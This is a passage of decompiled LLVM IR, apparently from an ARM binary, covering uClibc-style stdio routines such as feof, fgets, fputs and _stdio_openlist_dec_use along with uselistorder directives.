  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %bb161, %bb160, %dec_label_pc_11228
  %v2_11230 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11230, i32* @r4, align 4
  store i32 %v6_10cf8, i32* @r5, align 4
  store i32 %v27_10cf8, i32* @lr, align 4
  %v1_11234 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_11234

; uselistorder directives
  uselistorder i32 %v3_11208, { 1, 0 }
  uselistorder i32 %v1_111c4, { 1, 2, 0 }
  uselistorder i32 %v2_11160, { 1, 0 }
  uselistorder i32 %v1_11160, { 1, 0, 2 }
  uselistorder i32 %v0_11180, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_11158, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1111c, { 1, 2, 0 }
  uselistorder i32 %v0_1110c, { 1, 0 }
  uselistorder i32 %v1_110e8, { 1, 0, 2 }
  uselistorder i32 %v1_1105c, { 1, 2, 0 }
  uselistorder i32 %v1_11044, { 1, 0 }
  uselistorder i32 %v2_1102c, { 2, 1, 0 }
  uselistorder i32 %v1_11010, { 0, 2, 3, 1 }
  uselistorder i32 %v0_11008, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_10fec, { 1, 0, 2 }
  uselistorder i32 %v2_10fd4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10fc8, { 2, 1, 0 }
  uselistorder i32 %v1_10f88, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10f78.pre, { 0, 2, 1 }
  uselistorder i32 %v2_10f54, { 1, 0 }
  uselistorder i32 %v5_10eb4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10eb4, { 1, 0 }
  uselistorder i32 %v0_10eb876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_10e5c, { 1, 0 }
  uselistorder i32 %v0_10e7c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10e40, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10e28, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_10e18, { 1, 0 }
  uselistorder i32 %v3_10e10, { 0, 2, 1 }
  uselistorder i8 %v2_10e10, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10e90, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_10dd4, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10dc0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10da8, { 1, 0 }
  uselistorder i32 %v3_10db4.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_10d5c, { 0, 2, 1 }
  uselistorder i32 %v2_10d48, { 1, 0, 2 }
  uselistorder i32 %v0_10cfc, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 10, 9, 12, 11, 3, 4, 14, 5, 13, 6, 7, 8, 16, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1 }
  uselistorder i32 -38112, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_1122c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11228, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_111f4, { 1, 0 }
  uselistorder label %dec_label_pc_111c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_111b8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11174, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_1112c, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f40, { 1, 0 }
  uselistorder label %dec_label_pc_10ef4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10e70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e6c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10e08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e0c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10dac, { 1, 0 }
  uselistorder label %dec_label_pc_10d80, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_11268 = load i32, i32* @r4, align 4
  store i32 %v3_11268, i32* %stack_var_-20, align 4
  %v2_1126c = add i32 %tmp, 52
  %v3_1126c = inttoptr i32 %v2_1126c to i32*
  %v4_1126c = load i32, i32* %v3_1126c, align 4
  store i32 85376, i32* %r5.global-to-local, align 4
  %v1_11274 = sub i32 1, %v4_1126c
  %v2_11274 = icmp ult i32 %v4_1126c, 2
  br i1 %v2_11274, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_11274, %entry ]
  %v0_1127c = phi i32 [ 0, %bb ], [ %v1_11274, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_1127c = icmp eq i32 %v0_1127c, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_1127c, label %dec_label_pc_112c8, label %dec_label_pc_11290

dec_label_pc_11290:                               ; preds = %thread-pre-split
  %v2_11294 = add i32 %tmp, 56
  store i32 %v2_11294, i32* %r4.global-to-local, align 4
  %v4_112a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_112a8)
  %v0_112bc = load i32, i32* %r5.global-to-local, align 4
  %v2_112bc = add i32 %v0_112bc, 16
  %v3_112bc = inttoptr i32 %v2_112bc to i32*
  %v4_112bc = load i32, i32* %v3_112bc, align 4
  store i32 %v4_112bc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_112bc)
  %v0_112c8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_112cc.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_112c8.pre, 0
  br label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %thread-pre-split, %dec_label_pc_11290
  %v0_112cc = phi i32 [ %tmp, %thread-pre-split ], [ %v0_112cc.pre, %dec_label_pc_11290 ]
  %v0_112c8 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_11290 ]
  %v1_112cc = inttoptr i32 %v0_112cc to i16*
  %v2_112cc = load i16, i16* %v1_112cc, align 2
  %v3_112cc = zext i16 %v2_112cc to i32
  store i32 %v3_112cc, i32* %r4.global-to-local, align 4
  br i1 %v0_112c8, label %dec_label_pc_112c8..thread4_crit_edge, label %bb15

dec_label_pc_112c8..thread4_crit_edge:            ; preds = %dec_label_pc_112c8
  %v0_112e4.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_112c8
  %v1_112dc = load i32, i32* %r5.global-to-local, align 4
  %v3_112dc = add i32 %v1_112dc, 24
  %v4_112dc = inttoptr i32 %v3_112dc to i32*
  %v5_112dc = load i32, i32* %v4_112dc, align 4
  store i32 %v5_112dc, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_112c8..thread4_crit_edge, %bb15
  %v0_112e4 = phi i32 [ %v0_112e4.pre, %dec_label_pc_112c8..thread4_crit_edge ], [ %v5_112dc, %bb15 ]
  %v2_112e4 = xor i1 %v0_112c8, true
  call void @__pseudo_cond_branch(i1 %v2_112e4, i32 %v0_112e4)
  %v0_112e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_112e8 = and i32 %v0_112e8, 4
  %v2_112f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_112f0, i32* @r4, align 4
  ret i32 %v1_112e8

; uselistorder directives
  uselistorder i1 %v0_112c8, { 1, 0 }
  uselistorder i32 %v1_11274, { 1, 0 }
  uselistorder i32 %v4_1126c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_112c8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_112fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_112fc:
  %v0_112fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_112fc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_112fc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_112fc, %bb
  %v10_11308 = phi i32 [ %arg1, %dec_label_pc_112fc ], [ 0, %bb ]
  ret i32 %v10_11308

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1130c = load i32, i32* @r4, align 4
  store i32 %v3_1130c, i32* %stack_var_-28, align 4
  %v6_1130c = load i32, i32* @r5, align 4
  %v9_1130c = load i32, i32* @r6, align 4
  %v12_1130c = load i32, i32* @r7, align 4
  %v21_1130c = load i32, i32* @lr, align 4
  %v1_11310 = add i32 %arg3, 52
  %v2_11310 = inttoptr i32 %v1_11310 to i32*
  %v3_11310 = load i32, i32* %v2_11310, align 4
  %v1_11318 = sub i32 1, %v3_11310
  %v2_11318 = icmp ult i32 %v3_11310, 2
  br i1 %v2_11318, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_11318, %entry ]
  %v0_11320 = phi i32 [ 0, %bb ], [ %v1_11318, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_11320 = icmp eq i32 %v0_11320, 0
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_11320, label %dec_label_pc_11374, label %dec_label_pc_1133c

dec_label_pc_1133c:                               ; preds = %bb16
  %v1_11340 = add i32 %arg3, 56
  store i32 %v1_11340, i32* @r4, align 4
  %v4_11354 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11354)
  %v0_11368 = load i32, i32* @r5, align 4
  %v2_11368 = add i32 %v0_11368, 16
  %v3_11368 = inttoptr i32 %v2_11368 to i32*
  %v4_11368 = load i32, i32* %v3_11368, align 4
  store i32 %v4_11368, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11374.373 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11368)
  %v0_11374.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11378.pre = load i32, i32* @r7, align 4
  %v0_1137c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %bb16, %dec_label_pc_1133c
  %v0_1137c = phi i32 [ %arg3, %bb16 ], [ %v0_1137c.pre, %dec_label_pc_1133c ]
  %v0_11378 = phi i32 [ %arg2, %bb16 ], [ %v0_11378.pre, %dec_label_pc_1133c ]
  %v0_11374 = phi i32 [ %arg1, %bb16 ], [ %v0_11374.pre, %dec_label_pc_1133c ]
  %v3_11380 = inttoptr i32 %v0_11374 to i8*
  %v4_11380 = call i32 @__GI_fgets_unlocked(i8* %v3_11380, i32 %v0_11378, i32 %v0_1137c)
  %v0_11384 = load i32, i32* %sl.global-to-local, align 4
  %v2_11384 = icmp eq i32 %v0_11384, 0
  store i32 %v4_11380, i32* %r4.global-to-local, align 4
  br i1 %v2_11384, label %dec_label_pc_11374..thread3_crit_edge, label %bb17

dec_label_pc_11374..thread3_crit_edge:            ; preds = %dec_label_pc_11374
  %v0_113a0.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_11374
  %v1_11398 = load i32, i32* @r5, align 4
  %v3_11398 = add i32 %v1_11398, 24
  %v4_11398 = inttoptr i32 %v3_11398 to i32*
  %v5_11398 = load i32, i32* %v4_11398, align 4
  store i32 %v5_11398, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11374..thread3_crit_edge, %bb17
  %v0_113a0 = phi i32 [ %v0_113a0.pre, %dec_label_pc_11374..thread3_crit_edge ], [ %v5_11398, %bb17 ]
  %v2_113a0 = xor i1 %v2_11384, true
  call void @__pseudo_cond_branch(i1 %v2_113a0, i32 %v0_113a0)
  %v0_113a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_113ac = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_113ac, i32* @r4, align 4
  store i32 %v6_1130c, i32* @r5, align 4
  store i32 %v9_1130c, i32* @r6, align 4
  store i32 %v12_1130c, i32* @r7, align 4
  store i32 %v21_1130c, i32* @lr, align 4
  ret i32 %v0_113a4

; uselistorder directives
  uselistorder i32 %v3_11310, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_11374, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_113b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_113b8:
  %v0_113b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113b8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_113b8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_113b8, %bb
  %v10_113c4 = phi i32 [ %arg1, %dec_label_pc_113b8 ], [ 0, %bb ]
  ret i32 %v10_113c4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_113c8 = load i32, i32* @r4, align 4
  store i32 %v3_113c8, i32* %stack_var_-24, align 4
  %v6_113c8 = load i32, i32* @r5, align 4
  %v9_113c8 = load i32, i32* @r6, align 4
  %v12_113c8 = load i32, i32* @r7, align 4
  %v15_113c8 = load i32, i32* @r8, align 4
  %v18_113c8 = load i32, i32* @lr, align 4
  %v1_113cc = add i32 %arg2, 52
  %v2_113cc = inttoptr i32 %v1_113cc to i32*
  %v3_113cc = load i32, i32* %v2_113cc, align 4
  %v1_113d4 = sub i32 1, %v3_113cc
  %v2_113d4 = icmp ult i32 %v3_113cc, 2
  br i1 %v2_113d4, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_113d4, %entry ]
  %v0_113dc = phi i32 [ 0, %bb ], [ %v1_113d4, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_113dc = icmp eq i32 %v0_113dc, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_113dc, label %dec_label_pc_1142c, label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %thread-pre-split
  %v1_113f8 = add i32 %arg2, 56
  store i32 %v1_113f8, i32* @r4, align 4
  %v4_1140c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1140c)
  %v0_11420 = load i32, i32* @r5, align 4
  %v2_11420 = add i32 %v0_11420, 16
  %v3_11420 = inttoptr i32 %v2_11420 to i32*
  %v4_11420 = load i32, i32* %v3_11420, align 4
  store i32 %v4_11420, i32* @ip, align 4
  store i32 70700, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11420)
  %v0_1142c.pre = load i32, i32* @r7, align 4
  %v0_11430.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1142c

dec_label_pc_1142c:                               ; preds = %thread-pre-split, %dec_label_pc_113f4
  %v0_11430 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_11430.pre, %dec_label_pc_113f4 ]
  %v0_1142c = phi i32 [ %arg1, %thread-pre-split ], [ %v0_1142c.pre, %dec_label_pc_113f4 ]
  %v2_11434 = inttoptr i32 %v0_1142c to i8*
  %v3_11434 = call i32 @__GI_fputs_unlocked(i8* %v2_11434, i32 %v0_11430)
  %v0_11438 = load i32, i32* @r8, align 4
  %v2_11438 = icmp eq i32 %v0_11438, 0
  store i32 %v3_11434, i32* %r4.global-to-local, align 4
  br i1 %v2_11438, label %dec_label_pc_1142c..thread6_crit_edge, label %bb16

dec_label_pc_1142c..thread6_crit_edge:            ; preds = %dec_label_pc_1142c
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_1142c
  %v1_1144c = load i32, i32* @r5, align 4
  %v3_1144c = add i32 %v1_1144c, 24
  %v4_1144c = inttoptr i32 %v3_1144c to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1142c..thread6_crit_edge, %bb16
  %v0_11454.in = phi i32* [ @ip, %dec_label_pc_1142c..thread6_crit_edge ], [ %v4_1144c, %bb16 ]
  %v0_11454 = load i32, i32* %v0_11454.in, align 4
  %v2_11454 = xor i1 %v2_11438, true
  call void @__pseudo_cond_branch(i1 %v2_11454, i32 %v0_11454)
  %v0_11458 = load i32, i32* %r4.global-to-local, align 4
  %v2_11460 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11460, i32* @r4, align 4
  store i32 %v6_113c8, i32* @r5, align 4
  store i32 %v9_113c8, i32* @r6, align 4
  store i32 %v12_113c8, i32* @r7, align 4
  store i32 %v15_113c8, i32* @r8, align 4
  store i32 %v18_113c8, i32* @lr, align 4
  ret i32 %v0_11458

; uselistorder directives
  uselistorder i32 %v1_113d4, { 1, 0 }
  uselistorder i32 %v3_113cc, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1142c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1146c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1146c:
  %v0_1146c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1146c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1146c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1146c, %bb
  %v10_11478 = phi i32 [ %arg1, %dec_label_pc_1146c ], [ 0, %bb ]
  ret i32 %v10_11478

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1147c = load i32, i32* @r4, align 4
  store i32 %v3_1147c, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r6.global-to-local, align 4
  %v4_1148c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 36) to i32*), align 4
  store i32 %v4_1148c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_11494 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 112) to i32*), align 4
  store i32 %v4_11494, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_114a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  store i32 %v4_114a0, i32* %r7.global-to-local, align 4
  %v2_114ac = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_114a0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_114c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_114c0 = add i32 %v0_114c0, 16
  %v3_114c0 = inttoptr i32 %v2_114c0 to i32*
  %v4_114c0 = load i32, i32* %v3_114c0, align 4
  store i32 %v4_114c0, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_114c0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_114d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_114d0 = add i32 %v0_114d0, 12
  %v3_114d0 = inttoptr i32 %v2_114d0 to i32*
  %v4_114d0 = load i32, i32* %v3_114d0, align 4
  store i32 %v4_114d0, i32* %r3.global-to-local, align 4
  %v1_114d4 = inttoptr i32 %v4_114d0 to i32*
  %v2_114d4 = load i32, i32* %v1_114d4, align 4
  store i32 %v2_114d4, i32* %r3.global-to-local, align 4
  %v7_114d8 = icmp eq i32 %v2_114d4, 1
  br i1 %v7_114d8, label %dec_label_pc_114e0, label %dec_label_pc_115a0

dec_label_pc_114e0:                               ; preds = %entry
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_114e4 = add i32 %v0_114d0, 52
  %v3_114e4 = inttoptr i32 %v2_114e4 to i32*
  %v4_114e4 = load i32, i32* %v3_114e4, align 4
  store i32 %v4_114e4, i32* %r3.global-to-local, align 4
  %v1_114e8 = inttoptr i32 %v4_114e4 to i32*
  %v2_114e8 = load i32, i32* %v1_114e8, align 4
  store i32 %v2_114e8, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_114e8, 1
  br i1 %tmp32, label %dec_label_pc_115a0, label %dec_label_pc_114f4

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114e0
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_114f8 = add i32 %v0_114d0, 100
  %v3_114f8 = inttoptr i32 %v2_114f8 to i32*
  %v4_114f8 = load i32, i32* %v3_114f8, align 4
  store i32 %v4_114f8, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_114a0)
  call void @__pseudo_branch(i32 %v4_114c0)
  %v0_11520 = load i32, i32* %r6.global-to-local, align 4
  %v2_11520 = add i32 %v0_11520, 48
  %v3_11520 = inttoptr i32 %v2_11520 to i32*
  %v4_11520 = load i32, i32* %v3_11520, align 4
  store i32 %v4_11520, i32* %r3.global-to-local, align 4
  %v1_11524 = inttoptr i32 %v4_11520 to i32*
  %v2_11524 = load i32, i32* %v1_11524, align 4
  store i32 %v2_11524, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1157013 = icmp eq i32 %v2_11524, 0
  br i1 %v2_1157013, label %dec_label_pc_1157c, label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_114f4, %dec_label_pc_1156c
  %v0_115584 = phi i32 [ %v0_1156c, %dec_label_pc_1156c ], [ %v2_11524, %dec_label_pc_114f4 ]
  %v1_11534 = inttoptr i32 %v0_115584 to i16*
  %v2_11534 = load i16, i16* %v1_11534, align 2
  %v3_11534 = zext i16 %v2_11534 to i32
  store i32 %v3_11534, i32* %r3.global-to-local, align 4
  %v2_11538 = and i32 %v3_11534, 32816
  %v7_1153c = icmp eq i32 %v2_11538, 48
  %v1_11540 = add i32 %v0_115584, 32
  %v2_11540 = inttoptr i32 %v1_11540 to i32*
  %v3_11540 = load i32, i32* %v2_11540, align 4
  store i32 %v3_11540, i32* %r5.global-to-local, align 4
  br i1 %v7_1153c, label %dec_label_pc_1154c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_11534
  store i32 %v0_115584, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1156c

dec_label_pc_1154c:                               ; preds = %dec_label_pc_11534
  %v0_1154c = load i32, i32* %r7.global-to-local, align 4
  %v2_1154c = icmp eq i32 %v0_1154c, 0
  br i1 %v2_1154c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1154c
  %v1_11550 = load i32, i32* %r6.global-to-local, align 4
  %v2_11550 = load i32, i32* %r8.global-to-local, align 4
  %v3_11550 = add i32 %v2_11550, %v1_11550
  %v4_11550 = inttoptr i32 %v3_11550 to i32*
  %v5_11550 = load i32, i32* %v4_11550, align 4
  store i32 %v5_11550, i32* %r3.global-to-local, align 4
  %v3_11554 = inttoptr i32 %v5_11550 to i32*
  store i32 %v3_11540, i32* %v3_11554, align 4
  %v0_11558 = load i32, i32* %r4.global-to-local, align 4
  %v1_11558 = inttoptr i32 %v0_11558 to i16*
  %v2_11558 = load i16, i16* %v1_11558, align 2
  %v3_11558 = zext i16 %v2_11558 to i32
  store i32 %v3_11558, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_1154c
  %v2_1155810 = load i16, i16* %v1_11534, align 2
  %v3_1155811 = zext i16 %v2_1155810 to i32
  store i32 %v3_1155811, i32* %r3.global-to-local, align 4
  %v3_1155c = add i32 %v0_1154c, 32
  %v4_1155c = inttoptr i32 %v3_1155c to i32*
  store i32 %v3_11540, i32* %v4_1155c, align 4
  %v0_11560.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_11560 = phi i32 [ %v3_11558, %.thread ], [ %v0_11560.pre, %bb ]
  %v1_11560 = and i32 %v0_11560, 8192
  %v2_11560 = icmp eq i32 %v1_11560, 0
  br i1 %v2_11560, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_11568 = xor i1 %v2_11560, true
  call void @__pseudo_cond_branch(i1 %v1_11568, i32 ptrtoint (i32* @global_var_1363c.312 to i32))
  %v0_1156c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1156c

dec_label_pc_1156c:                               ; preds = %.thread23, %bb35
  %v0_1156c = phi i32 [ %v0_1156c.pre, %bb35 ], [ %v3_11540, %.thread23 ]
  store i32 %v0_1156c, i32* %r4.global-to-local, align 4
  %v2_11570 = icmp eq i32 %v0_1156c, 0
  br i1 %v2_11570, label %dec_label_pc_11570.dec_label_pc_1157c_crit_edge, label %dec_label_pc_11534

dec_label_pc_11570.dec_label_pc_1157c_crit_edge:  ; preds = %dec_label_pc_1156c
  %v0_11588.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_11570.dec_label_pc_1157c_crit_edge, %dec_label_pc_114f4
  %v0_11588 = phi i32 [ %v0_11588.pre, %dec_label_pc_11570.dec_label_pc_1157c_crit_edge ], [ %v0_11520, %dec_label_pc_114f4 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_11588 = add i32 %v0_11588, 24
  %v3_11588 = inttoptr i32 %v2_11588 to i32*
  %v4_11588 = load i32, i32* %v3_11588, align 4
  call void @__pseudo_branch(i32 %v4_11588)
  store i32 52, i32* %r3.global-to-local, align 4
